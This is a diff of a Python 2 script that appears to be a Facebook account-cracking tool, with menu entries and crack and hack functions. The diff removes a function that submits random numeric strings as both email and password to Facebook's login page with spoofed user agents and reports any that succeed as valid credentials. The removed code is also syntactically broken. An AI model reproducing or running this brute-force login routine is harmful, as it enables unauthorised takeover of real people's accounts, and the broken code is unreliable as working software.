@@ -1011,8 +1011,6 @@ def menu():
         time.sleep(0.05)
         print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m11.\033[1;96m\033[1;96m Tool     Rest &  Update         "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m12.\033[1;96m\033[1;96m USA          "
-        time.sleep(0.05)
 	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m0 .\033[1;91m\033[1;91m logout                         "
 	pilih()
 
@@ -1095,8 +1093,6 @@ def pilih():
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
-        elif unikers =="12":
-                available_facebook_motah()
 	elif unikers =="0":
 		jalan('Token Removed')
                 print logo22
@@ -1352,70 +1348,7 @@ _______¶¶¶_________¶______¶_________¶¶¶______
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	crack()
-
-def available_facebook_motah():
-        global toket
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		print"\x1b[1;94mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
-	os.system('clear')
-	print logo11
-	print ""
-        print ""
-        print"    options (available_facebook_motah):" 
-        print ""
-        print"        Name      Current Setting      Required      Description"
-        print"        NOMBER    "+nomber[0]+"                   yes           NOMBER "
-        print ""
-        print ""
-	available_facebook_motah()
-        print "[*]"+default+"starting cracking"
-        print ""
-	def menu():
-	try:
-		email = str(raw_input("email"))
-		email = str(random.randint(11111111,99999999))
-		go = kk + email
-                password = str(raw_input("bass" ))
-                password = str(random.randint(11111111,99999999))
-                login = 'https://www.facebook.com/login.php?login_attempt=1'
-                useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-                basss = random.randint(1111111,9999999)
-                br = mechanize.Browser()
-                amer = cookielib.LWPCookieJar()
-                br.set_handle_robots(False)
-                br.set_handle_redirect(True)
-                br.set_cookiejar(amer)
-                br.set_handle_equiv(True)
-                br.set_handle_referer(True)
-                br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5) 
-                br.addheaders = [('User-agent', random.choice(useragents))]
-                site = br.open(login)
-                br.select_form(nr = 0)
-                br.form['email'] = go
-                br.form['pass'] = go
-                sub = br.submit()
-                log = sub.geturl()
-                print b,"[*]Check===> ",r,go
-                if "https://www.facebook.com/checkpoint/?next" in log :
-			print g,"[*]good ---------> ",c,go
-                elif "https://www.facebook.com/login.php" and "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
-                        print ""
-                elif "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
-                        print ""
-		else :
-			print y,"--------------------------------"
-                        print g,"[*]email ---------> ",g,go
-                        print g,"[*]pass ---------> ",g,go
-                        print y,"--------------------------------"
-                        pilih()
-		        raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
-			menu()        
+        
 def hack():
 	global toket
 	os.system('clear')
